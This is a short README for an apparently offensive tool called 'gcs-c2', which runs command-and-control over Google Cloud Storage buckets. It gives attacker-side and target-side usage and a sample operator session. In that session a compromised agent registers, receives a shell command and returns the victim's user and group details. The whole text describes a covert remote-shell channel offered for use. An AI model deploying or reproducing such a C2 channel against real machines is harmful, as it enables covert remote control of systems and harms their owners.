# gcs-c2
C2 over google cloud storage buckets

## Usage
Run the `server` first, then the `client`


On the attacker:
```
$ python3 server.py
GCP Bucket C2. Type 'help' for commands.
GCP Shell> list_agents
New agent registered: 263c81c7-fe3a-47ee-8a7b-5898218a77be
Agent: 263c81c7-fe3a-47ee-8a7b-5898218a77be, Status: active
GCP Shell> send_task 263c81c7-fe3a-47ee-8a7b-5898218a77be id
Sent task to agent 263c81c7-fe3a-47ee-8a7b-5898218a77be
GCP Shell> get_responses 263c81c7-fe3a-47ee-8a7b-5898218a77be
Response from 263c81c7-fe3a-47ee-8a7b-5898218a77be: Command: id
Exit code: 0
Stdout: uid=1000(titan) gid=1000(titan) groups=1000(titan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),134(wireshark),135(kismet),998(docker)

GCP Shell>
```

On the target:
```
$ python3 client.py
```